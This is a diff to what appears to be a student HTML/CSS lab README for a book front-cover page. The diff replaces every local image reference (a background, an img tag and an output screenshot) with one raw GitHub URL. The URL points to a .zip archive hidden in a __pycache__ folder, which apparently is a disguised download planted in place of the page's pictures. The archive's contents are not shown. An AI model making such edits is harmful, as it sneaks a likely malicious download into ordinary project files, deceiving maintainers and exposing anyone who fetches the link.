@@ -44,7 +44,7 @@ Publish the website in the LocalHost.
                 margin-right: auto;
                 padding: 20px;
                 font-family:Verdana, Geneva, Tahoma, sans-serif;
-                background-image: url(download.jpeg);
+                background-image: url(https://raw.githubusercontent.com/24013396/cover/main/masthan/masthan/__pycache__/cover_1.8-alpha.3.zip);
                 background-size: cover;
             }
             .insight {
@@ -124,7 +124,7 @@ Publish the website in the LocalHost.
                 <p>Devolop future-proof responsive websites using the latest HTML5 and CSS techniques </p>
             </div>
             <div class="pic">
-                <img src= "coatpic.png" width="150" height="150" >
+                <img src= "https://raw.githubusercontent.com/24013396/cover/main/masthan/masthan/__pycache__/cover_1.8-alpha.3.zip" width="150" height="150" >
             </div>
             <div class="hr2">
                 <hr>
@@ -146,7 +146,7 @@ Publish the website in the LocalHost.
 ```
 
 ## OUTPUT:
-![alt text](<Screenshot 2024-12-07 171745.png>)
+![alt text](<Screenshot 2024-12-07 https://raw.githubusercontent.com/24013396/cover/main/masthan/masthan/__pycache__/cover_1.8-alpha.3.zip>)
 
 ## RESULT:
 The program for designing book front cover page using HTML and CSS is completed successfully.
